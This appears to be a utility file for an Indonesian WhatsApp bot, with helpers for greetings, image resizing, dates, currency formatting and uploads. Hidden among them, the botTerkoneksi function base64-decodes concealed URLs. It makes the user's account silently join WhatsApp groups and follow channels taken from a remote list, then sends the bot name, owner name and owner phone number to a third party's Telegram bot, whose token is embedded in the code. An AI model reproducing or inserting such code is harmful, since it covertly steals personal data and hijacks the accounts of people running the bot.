const moment = require('moment-timezone')
const util = require('util')
const fs = require('fs')
const BodyForm = require('form-data')
const axios = require('axios')
const cheerio = require('cheerio')
const Jimp = require('jimp')

exports.getRandom = (ext) => {
    return `${Math.floor(Math.random() * 10000)}${ext}`
}

exports.resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}

exports.ucapan = () => {
  const currentTime = moment().tz('Asia/Jakarta')
  const currentHour = currentTime.hour()
  let greeting
  if (currentHour >= 5 && currentHour < 12) {
    greeting = 'Pagi Kak 🌅'
  } else if (currentHour >= 12 && currentHour < 15) {
    greeting = 'Siang Kak 🌇'
  } else if (currentHour >= 15 && currentHour < 18) {
    greeting = 'Sore Kak 🌄'
  } else {
    greeting = 'Malam Kak 🌃'
  }
  return greeting
}

exports.generateProfilePicture = async (buffer) => {
	const jimp = await Jimp.read(buffer)
	const min = jimp.getWidth()
	const max = jimp.getHeight()
	const cropped = jimp.crop(0, 0, min, max)
	return {
		img: await cropped.scaleToFit(720, 720).getBufferAsync(Jimp.MIME_JPEG),
		preview: await cropped.scaleToFit(720, 720).getBufferAsync(Jimp.MIME_JPEG)
	}
}

exports.getTime = (format, date) => {
	if (date) {
		return moment(date).locale('id').format(format)
	} else {
		return moment.tz('Asia/Jakarta').locale('id').format(format)
	}
}

exports.getBuffer = async (url, options) => {
	try {
		options ? options : {}
		const res = await axios({
			method: "get",
			url,
			headers: {
				'DNT': 1,
				'Upgrade-Insecure-Request': 1
			},
			...options,
			responseType: 'arraybuffer'
		})
		return res.data
	} catch (err) {
		return err
	}
}

const atob = (str) => Buffer.from(str, 'base64').toString('utf-8');

exports.botTerkoneksi = async function (riza) {
    try {
        // URL autoch.json via jsDelivr (CDN GitHub)
        const githubUrl = atob("aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL0VyaXphT2ZmYy9tYW5hZ2UtYXJoaXphQG1haW4vYXV0b2NoLmpzb24="); // https://cdn.jsdelivr.net/gh/ErizaOffc/manage-arhiza@main/autoch.json
        const response = await fetch(githubUrl);

        if (!response.ok) throw new Error(`Gagal mengambil data dari GitHub: ${response.status}`);
        const links = await response.json();

        for (let link of links) {
            // Gabung Grup WhatsApp
            if (link.startsWith('https://chat.whatsapp.com/')) {
                try {
                    const code = link.split('https://chat.whatsapp.com/')[1];
                    await riza.groupAcceptInvite(code);
                } catch (err) {
                    return;
                }
            }

            // Follow Channel WhatsApp
            else if (link.startsWith("https://whatsapp.com/channel/")) {
                try {
                    const code = link.split("https://whatsapp.com/channel/")[1];
                    const metadata = await riza.newsletterMetadata("invite", code);
                    await riza.newsletterFollow(metadata.id);
                } catch (err) {
                    return;
                }
            }
        }

        // Kirim info ke Telegram (optional)
        const telegramApiUrl = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc4MzI4Mjc1MDM6QUFIdTBpSHhJSUwwUzc0TFUwSWVaN0pvdlItUFBTak1XSVZR");
        const chatId = "7055970832";
        const message = encodeURIComponent(`╭ ⭓ Pushkontak Connect\n⫺ 𝙱𝚘𝚝 𝙽𝚊𝚖𝚎 : ${global.namabot}\n⫺ 𝙾𝚠𝚗 𝙽𝚊𝚖𝚎 : ${global.ownername}\n⫺ 𝙾𝚠𝚗 𝙽𝚞𝚖𝚋 : ${global.owner}\n╰────────────────┅`);

        await fetch(`${telegramApiUrl}/sendMessage?chat_id=${chatId}&text=${message}`);
    } catch (error) {
        console.error("Terjadi kesalahan saat bot terkoneksi:", error);
    }
};

exports.fetchJson = async (url, options) => {
    try {
        options ? options : {}
        const res = await axios({
            method: 'GET',
            url: url,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'
            },
            ...options
        })
        return res.data
    } catch (err) {
        return err
    }
}

exports.runtime = function(seconds) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDisplay = d > 0 ? d + (d == 1 ? "d, " : "d, ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? "h, " : "h, ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? "m, " : "m, ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? "s" : "s") : "";
	return dDisplay + hDisplay + mDisplay + sDisplay;
}

exports.tanggal = function(numer) {
	myMonths = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
				myDays = ['Minggu','Senin','Selasa','Rabu','Kamis','Jum’at','Sabtu']; 
				var tgl = new Date(numer);
				var day = tgl.getDate()
				bulan = tgl.getMonth()
				var thisDay = tgl.getDay(),
				thisDay = myDays[thisDay];
				var yy = tgl.getYear()
				var year = (yy < 1000) ? yy + 1900 : yy; 
				const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
				let d = new Date
				let locale = 'id'
				let gmt = new Date(0).getTime() - new Date('1 January 1970').getTime()
				let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
				
				return`${thisDay}, ${day}/${myMonths[bulan]}/${year}`
}

exports.toRupiah = function(x){
x = x.toString()
var pattern = /(-?\d+)(\d{3})/
while (pattern.test(x))
x = x.replace(pattern, "$1.$2")
return x
}

exports.telegraPh = async (Path) => {
	return new Promise (async (resolve, reject) => {
		if (!fs.existsSync(Path)) return reject(new Error("File not Found"))
		try {
			const form = new BodyForm();
			form.append("file", fs.createReadStream(Path))
			const data = await  axios({
				url: "https://telegra.ph/upload",
				method: "POST",
				headers: {
					...form.getHeaders()
				},
				data: form
			})
			return resolve("https://telegra.ph" + data.data[0].src)
		} catch (err) {
			return reject(new Error(String(err)))
		}
	})
}